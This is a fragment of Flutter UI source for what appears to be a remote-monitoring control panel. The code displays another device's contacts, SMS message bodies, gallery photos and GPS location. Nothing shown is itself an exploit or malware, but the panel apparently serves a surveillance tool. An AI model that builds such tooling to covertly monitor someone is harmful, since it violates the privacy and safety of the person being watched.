      final bytes = base64Decode(c);
      showDialog(
        context: context,
        builder: (_) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(12),
          child: Container(
            decoration: BoxDecoration(
              color: ControlTheme.white,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: ControlTheme.black, width: 3),
              boxShadow: ControlShadowUtils.md,
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.all(14),
                  decoration: const BoxDecoration(
                    color: ControlTheme.yellow,
                    borderRadius:
                        BorderRadius.vertical(top: Radius.circular(17)),
                    border: Border(
                      bottom:
                          BorderSide(color: ControlTheme.black, width: 2.5),
                    ),
                  ),
                  child: Row(
                    children: [
                      Expanded(
                        child: Text(
                          title,
                          style: const TextStyle(
                            color: ControlTheme.black,
                            fontSize: 14,
                            fontWeight: FontWeight.w900,
                            letterSpacing: 1,
                          ),
                        ),
                      ),
                      _PressWrap(
                        onTap: () => Navigator.pop(context),
                        child: Container(
                          padding: const EdgeInsets.all(6),
                          decoration: BoxDecoration(
                            color: ControlTheme.black,
                            borderRadius: BorderRadius.circular(8),
                          ),
                          child: const Icon(Icons.close_rounded,
                              color: ControlTheme.yellow, size: 16),
                        ),
                      ),
                    ],
                  ),
                ),
                ClipRRect(
                  borderRadius: const BorderRadius.vertical(
                      bottom: Radius.circular(17)),
                  child: Image.memory(bytes, fit: BoxFit.contain),
                ),
              ],
            ),
          ),
        ),
      );
    } catch (_) {
      _toast('Image decode failed');
    }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (_) => _brutalDialog(
        title: 'GPS Location',
        icon: Icons.my_location_rounded,
        iconColor: ControlTheme.success,
        contentWidget: Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: ControlTheme.yellowSoft,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: ControlTheme.black, width: 2.5),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  const Icon(Icons.arrow_upward,
                      color: ControlTheme.black, size: 16),
                  const SizedBox(width: 8),
                  Text(
                    'Latitude:  $lat',
                    style: const TextStyle(
                      color: ControlTheme.black,
                      fontSize: 13,
                      fontWeight: FontWeight.w900,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 8),
              Row(
                children: [
                  const Icon(Icons.arrow_forward,
                      color: ControlTheme.black, size: 16),
                  const SizedBox(width: 8),
                  Text(
                    'Longitude: $lng',
                    style: const TextStyle(
                      color: ControlTheme.black,
                      fontSize: 13,
                      fontWeight: FontWeight.w900,
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
        actions: [
          _dialogBtn(
            label: 'CLOSE',
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'OPEN MAPS',
            bgColor: ControlTheme.success,
            textColor: ControlTheme.white,
            onTap: () => launchUrl(
              Uri.parse(
                  'https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
              mode: LaunchMode.externalApplication,
            ),
          ),
        ],
      ),
    );
  }

  void _textDialog(String title, String content) {
    showDialog(
      context: context,
      builder: (_) => _brutalDialog(
        title: title,
        icon: Icons.info_rounded,
        iconColor: ControlTheme.blue,
        contentWidget: Container(
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: ControlTheme.yellowSoft,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: ControlTheme.black, width: 2.5),
          ),
          child: SelectableText(
            content,
            style: const TextStyle(
              color: ControlTheme.black,
              fontSize: 13,
              fontWeight: FontWeight.w600,
            ),
          ),
        ),
        actions: [
          _dialogBtn(
            label: 'CLOSE',
            onTap: () => Navigator.pop(context),
          ),
        ],
      ),
    );
  }

  // ─── CONTACTS / SMS / GALLERY SHEETS ────────────────────────
  void _contactsSheet(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => _buildSheetContainer(
        title: 'Contacts (${contacts.length})',
        icon: Icons.contacts_rounded,
        child: (sc) => ListView.separated(
          controller: sc,
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          itemCount: contacts.length,
          separatorBuilder: (_, __) =>
              const Divider(color: ControlTheme.black, height: 2),
          itemBuilder: (_, i) {
            final contact = contacts[i];
            return ListTile(
              contentPadding:
                  const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
              leading: Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  color: ControlTheme.yellow,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: ControlTheme.black, width: 2.5),
                ),
                child: const Icon(Icons.person_rounded,
                    color: ControlTheme.black, size: 22),
              ),
              title: Text(
                contact['name']?.toString() ?? '-',
                style: const TextStyle(
                  color: ControlTheme.black,
                  fontSize: 13,
                  fontWeight: FontWeight.w800,
                ),
              ),
              subtitle: Text(
                contact['number']?.toString() ?? '-',
                style: const TextStyle(
                  color: ControlTheme.textMuted,
                  fontSize: 11,
                  fontWeight: FontWeight.w600,
                ),
              ),
            );
          },
        ),
      ),
    );
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => _buildSheetContainer(
        title: 'SMS (${sms.length})',
        icon: Icons.sms_rounded,
        child: (sc) => ListView.separated(
          controller: sc,
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          itemCount: sms.length,
          separatorBuilder: (_, __) =>
              const Divider(color: ControlTheme.black, height: 2),
          itemBuilder: (_, i) {
            final s = sms[i] as Map;
            return ListTile(
              contentPadding:
                  const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
              leading: Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  color: ControlTheme.yellow,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: ControlTheme.black, width: 2.5),
                ),
                child: const Icon(Icons.sms_rounded,
                    color: ControlTheme.black, size: 22),
              ),
              title: Text(
                s['address']?.toString() ?? '-',
                style: const TextStyle(
                  color: ControlTheme.black,
                  fontSize: 13,
                  fontWeight: FontWeight.w800,
                ),
              ),
              subtitle: Text(
                s['body']?.toString() ?? '',
                style: const TextStyle(
                  color: ControlTheme.textMuted,
                  fontSize: 11,
                  fontWeight: FontWeight.w600,
                ),
                maxLines: 2,
                overflow: TextOverflow.ellipsis,
              ),
            );
          },
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => _buildSheetContainer(
        title: 'Gallery (${imgs.length})',
        icon: Icons.photo_library_rounded,
        child: (sc) => imgs.isEmpty
            ? _emptyState(Icons.photo_library_rounded, 'No photos')
            : GridView.builder(
                controller: sc,
                padding: const EdgeInsets.all(12),
                gridDelegate:
                    const SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 3,
                  crossAxisSpacing: 8,
                  mainAxisSpacing: 8,
                ),
                itemCount: imgs.length,
                itemBuilder: (_, i) {
                  try {
                    final raw = imgs[i].toString();
                    final clean =
                        raw.contains(',') ? raw.split(',').last : raw;
                    final bytes = base64Decode(clean);
                    return GestureDetector(
                      onTap: () =>
                          _imgDialog(raw, 'Gallery Photo ${i + 1}'),
                      child: Container(
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(10),
                          border: Border.all(
                              color: ControlTheme.black, width: 2.5),
                          boxShadow: ControlShadowUtils.sm,
                        ),
                        child: ClipRRect(
                          borderRadius: BorderRadius.circular(8),
                          child: Image.memory(bytes, fit: BoxFit.cover),
                        ),
                      ),
                    );
                  } catch (_) {
                    return Container(
                      decoration: BoxDecoration(
                        color: ControlTheme.yellow,
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(
                            color: ControlTheme.black, width: 2),
                      ),
                    );
                  }
                },
              ),
      ),
    );
  }

  // ─── GRID BUTTONS ───────────────────────────────────────────
  Widget _buildGridButtons(List<_GridButton> buttons,
      {int columns = 2}) {
    final List<Widget> rows = [];
    for (int i = 0; i < buttons.length; i += columns) {
      final rowButtons = buttons.skip(i).take(columns).toList();
      rows.add(
        Padding(
          padding: const EdgeInsets.only(bottom: 12),
          child: Row(
            children: [
              for (int j = 0; j < rowButtons.length; j++)
                Expanded(
                  child: Padding(
                    padding: EdgeInsets.only(
                        right: j < rowButtons.length - 1 ? 12 : 0),
                    child: _gridButton(rowButtons[j]),
                  ),
                ),
              for (int j = rowButtons.length; j < columns; j++)
                const Expanded(child: SizedBox()),
            ],
          ),
        ),
      );
    }
    return Column(children: rows);
  }

  Widget _gridButton(_GridButton btn) {
    return _PressWrap(
      onTap: btn.onTap,
      child: Container(
        height: 100,
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: ControlTheme.white,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: ControlTheme.black, width: 2.5),
          boxShadow: ControlShadowUtils.sm,
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 44,
              height: 44,
              decoration: BoxDecoration(
                color: btn.color.withOpacity(0.15),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: ControlTheme.black, width: 2),
              ),
              child: Icon(btn.icon, color: btn.color, size: 22),
            ),
            const SizedBox(height: 8),
            Text(
              btn.label,
              style: const TextStyle(
                fontSize: 10,
                fontWeight: FontWeight.w900,
                color: ControlTheme.black,
                letterSpacing: 0.5,
              ),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }

  // ─── HELPERS ────────────────────────────────────────────────
  Widget _infoRow(String num, String text) => Padding(
        padding: const EdgeInsets.symmetric(vertical: 4),
        child: Row(
          children: [
            Container(
              width: 24,
              height: 24,
              decoration: BoxDecoration(
                color: ControlTheme.yellow,
                borderRadius: BorderRadius.circular(6),
                border: Border.all(color: ControlTheme.black, width: 2),
              ),
              child: Center(
                child: Text(
                  num,
                  style: const TextStyle(
                    fontSize: 10,
                    fontWeight: FontWeight.w900,
                    color: ControlTheme.black,
                  ),
                ),
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                text,
                style: const TextStyle(
                  color: ControlTheme.black,
                  fontSize: 10,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
          ],
        ),
      );

  Widget _field(TextEditingController ctrl, String label,
          {String hint = '', bool isNum = false}) =>
      TextField(
        controller: ctrl,
        keyboardType: isNum ? TextInputType.number : TextInputType.text,
        style: const TextStyle(
          color: ControlTheme.black,
          fontSize: 13,
          fontWeight: FontWeight.w700,
        ),
        decoration: InputDecoration(
          labelText: label,
          hintText: hint,
          labelStyle: const TextStyle(
            color: ControlTheme.black,
            fontSize: 11,
            fontWeight: FontWeight.w800,
          ),
          hintStyle: const TextStyle(
            color: ControlTheme.textMuted,
            fontSize: 11,
            fontWeight: FontWeight.w600,
          ),
          filled: true,
          fillColor: ControlTheme.yellowSoft,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(10),
            borderSide:
                const BorderSide(color: ControlTheme.black, width: 2.5),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(10),
            borderSide:
                const BorderSide(color: ControlTheme.black, width: 2.5),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(10),
            borderSide:
                const BorderSide(color: ControlTheme.black, width: 3),
          ),
        ),
      );

  // ─── BRUTAL DIALOG BUILDER ──────────────────────────────────
  Widget _brutalDialog({
    required String title,
    required IconData icon,
    required Color iconColor,
    String? content,
    Widget? contentWidget,
    required List<Widget> actions,
  }) {
    return Dialog(
      backgroundColor: Colors.transparent,
      insetPadding: const EdgeInsets.symmetric(horizontal: 24),
      child: Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: ControlTheme.white,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: ControlTheme.black, width: 3),
          boxShadow: ControlShadowUtils.md,
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: ControlTheme.yellow,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: ControlTheme.black, width: 2.5),
                    boxShadow: ControlShadowUtils.sm,
                  ),
                  child: Icon(icon, color: iconColor, size: 20),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Text(
                    title.toUpperCase(),
                    style: const TextStyle(
                      color: ControlTheme.black,
                      fontSize: 14,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1.5,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 16),
            if (content != null)
              Text(
                content,
                style: const TextStyle(
                  color: ControlTheme.textSec,
                  fontSize: 13,
                  fontWeight: FontWeight.w600,
                  height: 1.4,
                ),
              ),
            if (contentWidget != null) contentWidget,
            const SizedBox(height: 20),
            Wrap(
              alignment: WrapAlignment.end,
              spacing: 10,
              runSpacing: 10,
              children: actions,
            ),
          ],
        ),
      ),
    );
  }

  Widget _dialogBtn({
    required String label,
    required VoidCallback onTap,
    Color bgColor = ControlTheme.white,
    Color textColor = ControlTheme.black,
  }) {
    return _PressWrap(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
        decoration: BoxDecoration(
          color: bgColor,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: ControlTheme.black, width: 2.5),
          boxShadow: bgColor == ControlTheme.white
              ? null
              : ControlShadowUtils.sm,
        ),
        child: Text(
          label,
          style: TextStyle(
            color: textColor,
            fontWeight: FontWeight.w900,
            fontSize: 11,
            letterSpacing: 1,
          ),
        ),
      ),
    );
  }
}

class _GridButton {
  final String label;
  final Color color;
  final IconData icon;
  final VoidCallback onTap;

  _GridButton(this.label, this.color, this.icon, this.onTap);
}